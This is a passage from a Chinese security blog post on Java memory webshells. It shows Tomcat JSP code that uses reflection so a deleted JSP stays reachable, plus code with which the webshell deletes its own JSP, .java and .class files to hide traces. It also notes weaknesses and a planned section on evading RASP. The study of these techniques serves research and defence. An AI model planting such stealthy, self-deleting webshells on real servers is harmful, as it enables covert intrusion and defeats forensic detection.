class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.jasper.compiler.JspRuntimeContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.Wrapper&quot;</span> %&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line"></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line"></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line"></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    jsw.setLastModificationTest(<span class="number">8223372036854775807L</span>);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<h3 id="实现自删除"><a href="#实现自删除" class="headerlink" title="实现自删除"></a>实现自删除</h3><p>上面只是分析了如何让我们的JSP在删除了<code>JSP\java\Class</code>文件后还能访问，下面我们分析如何在<code>JSP</code>中实现删除<code>JSP\java\Class</code>文件，在<code>JspCompilationContext</code>保存着 JSP 编译的上下文信息，我们可以从中拿到<code>java/class</code>的绝对路径。</p>
<p>而<code>JspCompilationContext</code>对象保存在<code>JspServletWrapper</code>中，所以要先获取<code>JspServletWrapper</code></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="comment">//从request对象中获取request属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">requestF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    requestF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) requestF.get(request);</span><br><span class="line">    <span class="comment">//获取MappingData</span></span><br><span class="line">    <span class="type">MappingData</span> <span class="variable">mappingData</span> <span class="operator">=</span> req.getMappingData();</span><br><span class="line">    <span class="comment">//获取Wrapper，这里的Wrapper是StandrardWrapper</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">wrapperF</span> <span class="operator">=</span> mappingData.getClass().getDeclaredField(<span class="string">&quot;wrapper&quot;</span>);</span><br><span class="line">    wrapperF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Wrapper</span> <span class="variable">wrapper</span> <span class="operator">=</span> (Wrapper) wrapperF.get(mappingData);</span><br><span class="line">    <span class="comment">//获取jspServlet对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">instanceF</span> <span class="operator">=</span> wrapper.getClass().getDeclaredField(<span class="string">&quot;instance&quot;</span>);</span><br><span class="line">    instanceF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Servlet</span> <span class="variable">jspServlet</span> <span class="operator">=</span> (Servlet) instanceF.get(wrapper);</span><br><span class="line">    <span class="comment">//获取rctxt属性</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">rctxt</span> <span class="operator">=</span> jspServlet.getClass().getDeclaredField(<span class="string">&quot;rctxt&quot;</span>);</span><br><span class="line">    rctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspRuntimeContext</span> <span class="variable">jspRuntimeContext</span> <span class="operator">=</span> (JspRuntimeContext) rctxt.get(jspServlet);</span><br><span class="line">    <span class="comment">//获取jsps属性内容</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">jspsF</span> <span class="operator">=</span> jspRuntimeContext.getClass().getDeclaredField(<span class="string">&quot;jsps&quot;</span>);</span><br><span class="line">    jspsF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">ConcurrentHashMap</span> <span class="variable">jsps</span> <span class="operator">=</span> (ConcurrentHashMap) jspsF.get(jspRuntimeContext);</span><br><span class="line">    <span class="comment">//获取对应的JspServletWrapper</span></span><br><span class="line">    <span class="type">JspServletWrapper</span> <span class="variable">jsw</span> <span class="operator">=</span> (JspServletWrapper)jsps.get(request.getServletPath());</span><br><span class="line">    <span class="comment">//获取ctxt属性保存的JspCompilationContext对象</span></span><br><span class="line">    <span class="type">Field</span> <span class="variable">ctxt</span> <span class="operator">=</span> jsw.getClass().getDeclaredField(<span class="string">&quot;ctxt&quot;</span>);</span><br><span class="line">    ctxt.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">JspCompilationContext</span> <span class="variable">jspCompContext</span> <span class="operator">=</span> (JspCompilationContext) ctxt.get(jsw);</span><br><span class="line">    File targetFile;</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getClassFileName());<span class="comment">//删掉jsp的.class</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    targetFile = <span class="keyword">new</span> <span class="title class_">File</span>(jspCompContext.getServletJavaFileName());<span class="comment">//删掉jsp的java文件</span></span><br><span class="line">    targetFile.delete();</span><br><span class="line">    <span class="comment">//删除JSP文件</span></span><br><span class="line">    <span class="type">String</span> <span class="variable">__jspName</span> <span class="operator">=</span> <span class="built_in">this</span>.getClass().getSimpleName().replaceAll(<span class="string">&quot;_&quot;</span>, <span class="string">&quot;.&quot;</span>);</span><br><span class="line">    String path=application.getRealPath(__jspName);</span><br><span class="line">    <span class="type">File</span> <span class="variable">file</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">File</span>(path);</span><br><span class="line">    file.delete();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>tomcat7和8&#x2F;9的<code>MappingData</code>类包名发生了变化</strong></p>
<div class="highlight-container" data-rel="Jsp"><figure class="iseeu highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tomcat7:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.tomcat.util.http.mapper.MappingData&quot;</span> %&gt;</span><br><span class="line">tomcat8/<span class="number">9</span>:&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.mapper.MappingData&quot;</span> %&gt;</span><br></pre></td></tr></table></figure></div>



<p><strong>jsp马源码见项目中我写的： <code>KoishiEvilJSP.jsp</code></strong></p>
<p>该内存马能够成功执行</p>
<h3 id="字节码加载实现"><a href="#字节码加载实现" class="headerlink" title="字节码加载实现"></a>字节码加载实现</h3><p>一般情况下，我们想上传jsp然后访问执行是不现实的&#x3D;。&#x3D;，因为大多数时候不是热加载，而且也不符合我们对无文件shell的预期，于是这里我尝试修改jsp文件为java文件，并通过打字节码的方式，使jsp加载。（我看好像没啥这方面资料，全都是jsp落地，还是这种加载字节码的比较合适）</p>
<p><strong>详情见代码，emm没打通，可能是加载写的poc入口有问题，没加载上？</strong></p>
<p>后面debug调吧，现在挺忙的，我感觉写的代码应该没问题</p>
<h3 id="不足与缺点"><a href="#不足与缺点" class="headerlink" title="不足与缺点"></a><strong>不足与缺点</strong></h3><ul>
<li>由于jsp的servlet处理类一般都是JspServletWrapper类，所以对于这种自己实现JspServletWrapper类的方法很容易就可以被查杀</li>
<li>由于jsp的局限性，在MVC架构的背景下应用场景也不大</li>
</ul>
<h2 id="十三、JNI绕过RASP"><a href="#十三、JNI绕过RASP" class="headerlink" title="十三、JNI绕过RASP"></a>十三、JNI绕过RASP</h2><p>这个后面再看吧。目前这个还用不上</p>

        </div>

        
            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
                <div class="article-copyright-info-container">
    <ul>
        <li><strong>标题:</strong> java 内存马学习</li>
        <li><strong>作者:</strong> Ko1sh1</li>
        <li><strong>创建于
                :</strong> 2022-03-08 10:47:54</li>
        
            <li>
                <strong>更新于
                    :</strong> 2024-03-11 20:22:34
            </li>
        
        <li>
            <strong>链接:</strong> https://ko1sh1.github.io/2022/03/08/Memshell内存马/
        </li>
        <li>
            <strong>
                版权声明:
            </strong>
            

            
                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
            
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
                
                    <li class="tag-item mx-0.5">
                        <a href="/tags/%E6%8A%80%E5%B7%A7/">#技巧</a>&nbsp;
                    </li>
                
            </ul>
        

        

        
            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
                
                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
                        <a class="prev"
                        rel="prev"
                        href="/2024/02/08/%E5%90%89%E6%9E%97%E7%9C%81%E7%AC%AC%E4%B8%89%E8%BD%AE%E8%81%94%E8%B5%9B-Web/"
                        >
                            <span class="left arrow-icon flex justify-center items-center">
                                <i class="fa-solid fa-chevron-left"></i>
                            </span>
                            <span class="title flex justify-center items-center">
                                <span class="post-nav-title-item">吉林省高校网络安全联赛第三轮 Web 官方题解</span>
                                <span class="post-nav-item">上一篇</span>
                            </span>
                        </a>
                    </div>
                
                
            </div>
        


        
            <div class="comment-container px-2 sm:px-6 md:px-8 pb-8">
                <div class="comments-container mt-10 w-full ">
    <div id="comment-anchor" class="w-full h-2.5"></div>
    <div class="comment-area-title w-full my-1.5 md:my-2.5 text-xl md:text-3xl font-bold">
        评论
    </div>
    

        
            
    <div class="twikoo-container">
        <script data-swup-reload-script
                src='https://cdn.staticfile.org/twikoo/1.6.31/twikoo.all.min.js'
        ></script>
        <div id="twikoo-comment"></div>
        <script data-swup-reload-script>
            function loadTwikoo() {
                twikoo.init({
                    el: '#twikoo-comment',
                    envId: 'https://ko1sh1-blog-comments.hf.space',
                });
            }

            if ('true') {
                const loadTwikooTimeout = setTimeout(() => {
                    loadTwikoo();
                    clearTimeout(loadTwikooTimeout);
                }, 1000);
            } else {
                window.addEventListener('DOMContentLoaded', loadTwikoo);
            }
        </script>
    </div>


        
        
    
</div>

            </div>
        
    </div>

    
        <div class="toc-content-container">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <div class="toc-title">此页目录</div>
        <div class="page-title">java 内存马学习</div>
        <ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">&#96;&#96;内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E7%AE%80%E8%BF%B0"><span class="nav-text">一、简述</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#Servlet-API-%E6%8F%90%E4%BE%9B%E7%9A%84%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E6%9C%BA%E5%88%B6"><span class="nav-text">Servlet API 提供的动态注册机制</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%8C%E3%80%81Filter-%E5%86%85%E5%AD%98%E9%A9%AC%E5%8E%9F%E7%90%86%E5%88%86%E6%9E%90"><span class="nav-text">二、Filter 内存马原理分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9%E5%BD%92%E7%BA%B3"><span class="nav-text">知识点归纳</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%A4%A7%E6%A6%82%E5%86%99%E4%B8%AA%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">大概写个内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%88%E7%AE%80%E5%8D%95%E7%90%86%E7%90%86%E6%80%9D%E8%B7%AF"><span class="nav-text">先简单理理思路</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%AD%A3%E5%BC%8F%E5%BC%80%E5%A7%8B"><span class="nav-text">正式开始</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%89%E3%80%81Servlet-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">三、Servlet 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86%E7%82%B9"><span class="nav-text">知识点</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%AE%80%E5%8D%95%E8%AE%B0%E5%BD%95%E4%B8%80%E4%B8%8BServlet%E7%9A%84%E5%91%A8%E6%9C%9F"><span class="nav-text">简单记录一下Servlet的周期</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Servlet%E7%9A%84%E7%94%9F%E6%88%90%E4%B8%8E%E5%8A%A8%E6%80%81%E6%B7%BB%E5%8A%A0"><span class="nav-text">Servlet的生成与动态添加</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Servlet-%E8%A3%85%E8%BD%BD%E8%BF%87%E7%A8%8B"><span class="nav-text">Servlet 装载过程</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%AD%A3%E5%BC%8F%E4%B9%A6%E5%86%99%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">正式书写内存马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%9B%9B%E3%80%81Listener%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">四、Listener内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%9F%A5%E8%AF%86"><span class="nav-text">知识</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%A3%E7%A0%81"><span class="nav-text">内存马代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%BA%94%E3%80%81Tomcat-%E5%9B%9E%E6%98%BE%E9%A9%AC"><span class="nav-text">五、Tomcat 回显马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE"><span class="nav-text">通用回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat%E9%A9%AC%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%A9%AC%EF%BC%9A"><span class="nav-text">tomcat马通用回显马：</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E9%A9%AC2"><span class="nav-text">马2</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE"><span class="nav-text">半通用回显</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#tomcat%E5%8D%8A%E9%80%9A%E7%94%A8%E5%9B%9E%E6%98%BE%E9%A9%AC"><span class="nav-text">tomcat半通用回显马</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B1%80%E9%99%90"><span class="nav-text">局限</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AD%E3%80%81Spring-Controller-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">六、Spring Controller 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#SpringMVC%E5%88%9D%E5%A7%8B%E5%8C%96%E8%BF%87%E7%A8%8B"><span class="nav-text">SpringMVC初始化过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%9F%A5%E6%89%BE%E8%BF%87%E7%A8%8B"><span class="nav-text">查找过程</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Controller-%E6%B3%A8%E5%86%8C%E8%BF%9B%E4%B8%80%E6%AD%A5%E5%AD%A6%E4%B9%A0"><span class="nav-text">Controller 注册进一步学习</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#1-%E8%8E%B7%E5%BE%97%E5%BD%93%E5%89%8D%E4%BB%A3%E7%A0%81%E8%BF%90%E8%A1%8C%E6%97%B6%E7%9A%84%E4%B8%8A%E4%B8%8B%E6%96%87%E7%8E%AF%E5%A2%83"><span class="nav-text">1.获得当前代码运行时的上下文环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#2-%E6%89%8B%E5%8A%A8%E6%B3%A8%E5%86%8C-controller"><span class="nav-text">2.手动注册 controller</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#3-controller%E7%9A%84%E7%BC%BA%E7%82%B9"><span class="nav-text">3. controller的缺点</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Spring-Controller-%E5%86%85%E5%AD%98%E9%A9%AC%E4%BB%A3%E7%A0%81"><span class="nav-text">Spring Controller 内存马代码</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%83%E3%80%81Spring-Interceptor-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">七、Spring Interceptor 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E6%B3%A8%E5%85%A5Interceptor"><span class="nav-text">动态注入Interceptor</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%85%AB%E3%80%81Tomcat-Valve-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">八、Tomcat Valve 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%A6%82%E5%BF%B5%E6%8F%90%E8%A6%81"><span class="nav-text">概念提要</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#valve%E5%86%85%E5%AD%98%E9%A9%AC%E7%BC%96%E5%86%99%E8%B7%AF%E7%A8%8B"><span class="nav-text">valve内存马编写路程</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B9%9D%E3%80%81GlassFish-Grizzly-Filter-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">九、GlassFish Grizzly Filter 内存马</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E3%80%81Java-Agent-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">十、Java Agent 内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#1%E3%80%81java-agent%E4%B8%A4%E4%B8%AA%E5%8A%A0%E8%BD%BD%E6%96%B9%E5%BC%8F%E4%BB%8B%E7%BB%8D"><span class="nav-text">1、java agent两个加载方式介绍</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#2%E3%80%81%E5%87%A0%E4%B8%AA%E9%87%8D%E8%A6%81%E7%9A%84%E7%B1%BB%EF%BC%9A"><span class="nav-text">2、几个重要的类：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ClassFileTransformer-%E6%8E%A5%E5%8F%A3"><span class="nav-text">ClassFileTransformer 接口</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VirtualMachine"><span class="nav-text">VirtualMachine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#CtMethod"><span class="nav-text">CtMethod</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#3%E3%80%81%E5%90%AF%E5%8A%A8%E6%97%B6%E5%8A%A0%E8%BD%BD-agent%E2%80%94%E2%80%94premain"><span class="nav-text">3、启动时加载 agent——premain</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%B0%8Fdemo%E5%B0%9D%E8%AF%95"><span class="nav-text">小demo尝试</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%8A%A8%E6%80%81%E4%BF%AE%E6%94%B9%E5%AD%97%E8%8A%82%E7%A0%81"><span class="nav-text">动态修改字节码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#4%E3%80%81%E5%90%AF%E5%8A%A8%E5%90%8E%E5%8A%A0%E8%BD%BD-agent%E2%80%94%E2%80%94agentmain"><span class="nav-text">4、启动后加载 agent——agentmain</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#VirtualMachine-1"><span class="nav-text">VirtualMachine</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#VirtualMachineDescriptor"><span class="nav-text">VirtualMachineDescriptor</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#Demo%EF%BC%88%E8%AF%A6%E6%83%85%E8%A7%81%E6%BA%90%E7%A0%81%EF%BC%89"><span class="nav-text">Demo（详情见源码）</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#agentmain-%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">agentmain 内存马</span></a></li></ol></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%80%E3%80%81Timer-%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">十一、Timer 型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%81%B6%E6%84%8Fjsp"><span class="nav-text">恶意jsp</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E7%BA%BF%E7%A8%8B%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">线程型内存马</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%BA%8C%E3%80%81JSP%E5%9E%8B%E5%86%85%E5%AD%98%E9%A9%AC"><span class="nav-text">十二、JSP型内存马</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E8%AF%B7%E6%B1%82%E5%90%8E%E4%B8%8D%E5%8E%BB%E6%A3%80%E6%9F%A5JSP%E6%96%87%E4%BB%B6%E6%98%AF%E5%90%A6%E5%AD%98%E5%9C%A8"><span class="nav-text">请求后不去检查JSP文件是否存在</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%B8%80"><span class="nav-text">方法一</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%96%B9%E6%B3%95%E4%BA%8C"><span class="nav-text">方法二</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AE%9E%E7%8E%B0%E8%87%AA%E5%88%A0%E9%99%A4"><span class="nav-text">实现自删除</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%AD%97%E8%8A%82%E7%A0%81%E5%8A%A0%E8%BD%BD%E5%AE%9E%E7%8E%B0"><span class="nav-text">字节码加载实现</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%B8%8D%E8%B6%B3%E4%B8%8E%E7%BC%BA%E7%82%B9"><span class="nav-text">不足与缺点</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%8D%81%E4%B8%89%E3%80%81JNI%E7%BB%95%E8%BF%87RASP"><span class="nav-text">十三、JNI绕过RASP</span></a></li></ol></li></ol>

    </div>
</div>
        </div>
    
</div>



                

            </div>

            

        </div>

        <div class="main-content-footer">
            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
    <div class="info-container py-3 text-center">
        
        <div class="text-center">
            &copy;
            
              <span>2024</span>
              -
            
            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Ko1sh1</a>
            
                
                <p class="post-count space-x-0.5">
                    <span>
                        共 3 篇文章
                    </span>
                    
                        <span>
                            共 32.7k 字
                        </span>
                    
                </p>
            
        </div>
        
        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
            <span class="lg:block text-sm">由 <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a> 驱动</span>
            <span class="text-sm lg:block">主题&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.6.1</a></span>
        </div>
        
        
            <div>
                博客已运行 <span class="odometer" id="runtime_days" ></span> 天 <span class="odometer" id="runtime_hours"></span> 小时 <span class="odometer" id="runtime_minutes"></span> 分钟 <span class="odometer" id="runtime_seconds"></span> 秒
            </div>
        
        
            <script data-swup-reload-script>
                try {
                    function odometer_init() {
                    const elements = document.querySelectorAll('.odometer');
                    elements.forEach(el => {
                        new Odometer({
                            el,
                            format: '( ddd).dd',
                            duration: 200
                        });
                    });
                    }
                    odometer_init();
                } catch (error) {}
            </script>
        
        
            
                
        
                
        
        
    </div>  
</footer>
        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="article-tools-list">
        <!-- TOC aside toggle -->
        
            <li class="right-bottom-tools page-aside-toggle">
                <i class="fa-regular fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
            <li class="go-comment">
                <i class="fa-regular fa-comments"></i>
            </li>
        
    </ul>
</div>

        </div>
    

    <div class="right-side-tools-container">
        <div class="side-tools-container">
    <ul class="hidden-tools-list">
        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-plus"></i>
        </li>

        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
            <i class="fa-regular fa-magnifying-glass-minus"></i>
        </li>

        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
            <i class="fa-regular fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
            <i class="fa-regular fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="visible-tools-list">
        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
